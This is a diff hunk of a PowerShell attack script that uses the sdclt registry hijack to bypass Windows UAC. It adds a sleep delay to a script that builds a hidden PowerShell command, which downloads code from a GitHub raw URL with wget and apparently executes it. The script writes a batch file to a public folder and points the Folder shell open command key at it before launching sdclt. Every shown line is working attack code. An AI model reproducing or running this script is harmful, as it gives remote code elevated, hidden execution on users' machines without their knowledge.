@@ -5,6 +5,7 @@ $Value = "powershell -windowstyle hidden `$a=((wget 'https://raw.githubuserconte
 New-Item -Path 'C:\Users\Public\A.bat' -Value '%A%'
 New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value "C:\Users\Public\A.bat"
 New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+sleep 5
 start cmd "/c start sdclt"
 sleep 3
 Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command"
